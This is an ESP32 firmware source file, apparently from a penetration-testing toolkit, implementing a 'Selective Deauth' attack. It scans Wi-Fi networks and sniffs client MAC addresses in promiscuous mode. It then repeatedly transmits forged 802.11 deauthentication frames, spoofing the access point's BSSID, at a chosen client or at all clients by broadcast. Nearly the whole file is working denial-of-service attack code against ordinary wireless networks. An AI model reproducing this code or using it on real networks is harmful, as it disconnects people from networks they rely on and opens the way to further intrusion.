#if !LITE_VERSION
#include "arsenal.h"
#include "arsenal_background.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <globals.h>

struct DeauthTarget {
    String ssid;
    uint8_t bssid[6];
    uint8_t channel;
};

struct DeauthClient {
    uint8_t mac[6];
    int8_t rssi;
};

#define DEAUTH_MAX_CLIENTS 16
static DeauthClient deauthClients[DEAUTH_MAX_CLIENTS];
static int deauthClientCount = 0;

static void deauthPromiscCb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT) return;
    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *frame = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    if (len < 24) return;

    uint8_t subtype = (frame[0] >> 4) & 0x0F;
    if (subtype != 0x04 && subtype != 0x05 && subtype != 0x00 && subtype != 0x08) return;

    const uint8_t *srcMac = frame + 10;
    for (int i = 0; i < deauthClientCount; i++) {
        bool match = true;
        for (int j = 0; j < 6; j++) {
            if (deauthClients[i].mac[j] != srcMac[j]) { match = false; break; }
        }
        if (match) return;
    }

    if (deauthClientCount < DEAUTH_MAX_CLIENTS) {
        memcpy(deauthClients[deauthClientCount].mac, srcMac, 6);
        deauthClients[deauthClientCount].rssi = pkt->rx_ctrl.rssi;
        deauthClientCount++;
    }
}

void arsenal_selective_deauth(void) {
    ARSENAL_HEAP_CHECK();
    if (WiFi.getMode() == WIFI_MODE_NULL) WiFi.mode(WIFI_STA);

    int n = WiFi.scanNetworks(false, true);
    if (n == 0) {
        displayRedStripe("No networks found");
        delay(1500);
        return;
    }

    options.clear();
    for (int i = 0; i < n && i < 15; i++) {
        uint8_t *bssid = WiFi.BSSID(i);
        char bssidStr[18];
        snprintf(bssidStr, sizeof(bssidStr), "%02X:%02X:%02X:%02X:%02X:%02X",
            bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
        String label = WiFi.SSID(i) + " (" + String(WiFi.RSSI(i)) + "dB) " + bssidStr;
        options.push_back({label, [i]() {}});
    }
    int targetIdx = -1;
    for (int i = 0; i < n && i < 15; i++) {
        options[i].operation = [i, &targetIdx]() { targetIdx = i; };
    }
    loopOptions(options, MENU_TYPE_SUBMENU, "Target AP");

    if (targetIdx < 0) return;

    DeauthTarget target;
    target.ssid = WiFi.SSID(targetIdx);
    memcpy(target.bssid, WiFi.BSSID(targetIdx), 6);
    target.channel = WiFi.channel(targetIdx);
    WiFi.scanDelete();

    drawMainBorderWithTitle("Selective Deauth");
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.setTextSize(FP);
    tft.setCursor(12, 50);
    tft.printf("Target: %s", target.ssid.c_str());
    tft.setCursor(12, 66);
    tft.print("Scanning for clients...");
    tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
    tft.drawCentreString(String("Esc to stop scan"), tftWidth / 2, tftHeight - 20, 1);

    memset(deauthClients, 0, sizeof(deauthClients));
    deauthClientCount = 0;

    bool bgWasRunning = arsenal_background_is_running();
    if (bgWasRunning) arsenal_background_stop();

    WiFi.mode(WIFI_STA);
    esp_wifi_set_channel(target.channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(deauthPromiscCb);

    unsigned long scanStart = millis();
    while (deauthClientCount < DEAUTH_MAX_CLIENTS && (millis() - scanStart) < 10000) {
        drawMainBorderWithTitle("Selective Deauth");
        int y = 45;
        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
        tft.setTextSize(FP);
        tft.setCursor(12, y);
        tft.printf("Target: %s", target.ssid.c_str());
        y += 14;
        tft.setCursor(12, y);
        tft.printf("Scanning... %ds", (int)((millis() - scanStart) / 1000));
        y += 14;
        tft.setCursor(12, y);
        tft.printf("Clients found: %d", deauthClientCount);
        y += 14;
        for (int i = 0; i < deauthClientCount && i < 5; i++) {
            tft.setCursor(12, y);
            tft.printf("%02X:%02X:%02X:%02X:%02X:%02X %d",
                deauthClients[i].mac[0], deauthClients[i].mac[1], deauthClients[i].mac[2],
                deauthClients[i].mac[3], deauthClients[i].mac[4], deauthClients[i].mac[5],
                (int)deauthClients[i].rssi);
            y += 12;
        }
        tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
        tft.drawCentreString(String("Esc:stop scan"), tftWidth / 2, tftHeight - 20, 1);
        if (check(EscPress)) break;
        delay(100);
    }

    esp_wifi_set_promiscuous(false);

    if (deauthClientCount == 0) {
        displayRedStripe("No clients found");
        delay(1500);
        if (bgWasRunning) arsenal_background_start();
        return;
    }

    options.clear();
    for (int i = 0; i < deauthClientCount; i++) {
        char macStr[18];
        snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
            deauthClients[i].mac[0], deauthClients[i].mac[1], deauthClients[i].mac[2],
            deauthClients[i].mac[3], deauthClients[i].mac[4], deauthClients[i].mac[5]);
        String label = String(macStr) + " (" + String(deauthClients[i].rssi) + "dB)";
        options.push_back({label, [i]() {}});
    }
    String broadcastLabel = "BROADCAST (all clients)";
    options.push_back({broadcastLabel, []() {}});
    int clientIdx = -1;
    for (int i = 0; i < deauthClientCount; i++) {
        options[i].operation = [i, &clientIdx]() { clientIdx = i; };
    }
    int broadcastIdx = deauthClientCount;
    options[broadcastIdx].operation = [&clientIdx, broadcastIdx]() { clientIdx = broadcastIdx; };
    loopOptions(options, MENU_TYPE_SUBMENU, "Target Client");

    if (clientIdx < 0) {
        if (bgWasRunning) arsenal_background_start();
        return;
    }

    bool isBroadcast = (clientIdx == broadcastIdx);
    uint8_t *targetClient = isBroadcast ? nullptr : deauthClients[clientIdx].mac;

    WiFi.mode(WIFI_STA);
    esp_wifi_set_channel(target.channel, WIFI_SECOND_CHAN_NONE);

    uint8_t deauthFrame[26];
    memset(deauthFrame, 0, sizeof(deauthFrame));
    deauthFrame[0] = 0xC0;
    deauthFrame[1] = 0x00;
    memcpy(deauthFrame + 16, target.bssid, 6);
    memcpy(deauthFrame + 4, target.bssid, 6);
    deauthFrame[24] = 0x07;
    deauthFrame[25] = 0x00;

    int sent = 0;
    unsigned long startTime = millis();

    while (true) {
        for (int i = 0; i < 10; i++) {
            if (isBroadcast) {
                uint8_t broadcastAddr[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                memcpy(deauthFrame + 10, target.bssid, 6);
                memcpy(deauthFrame + 4, broadcastAddr, 6);
            } else {
                memcpy(deauthFrame + 10, target.bssid, 6);
                memcpy(deauthFrame + 4, targetClient, 6);
            }
            esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
            sent++;
        }

        drawMainBorderWithTitle("Selective Deauth");
        int y = 45;
        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
        tft.setTextSize(FP);
        tft.setCursor(12, y);
        tft.printf("AP: %s", target.ssid.c_str());
        y += 14;
        if (isBroadcast) {
            tft.setCursor(12, y);
            tft.print("Client: BROADCAST");
        } else {
            tft.setCursor(12, y);
            tft.printf("Client: %02X:%02X:%02X..",
                targetClient[0], targetClient[1], targetClient[2]);
        }
        y += 14;
        tft.setCursor(12, y);
        tft.printf("Deauths sent: %d", sent);
        y += 14;
        unsigned long elapsed = (millis() - startTime) / 1000;
        tft.setCursor(12, y);
        tft.printf("Time: %lus", elapsed);
        tft.setTextColor(TFT_RED, bruceConfig.bgColor);
        tft.drawCentreString(String("Esc:stop"), tftWidth / 2, tftHeight - 20, 1);

        if (check(EscPress)) break;
        esp_task_wdt_reset();
        delay(30);
    }

    if (bgWasRunning) arsenal_background_start();
}
#endif
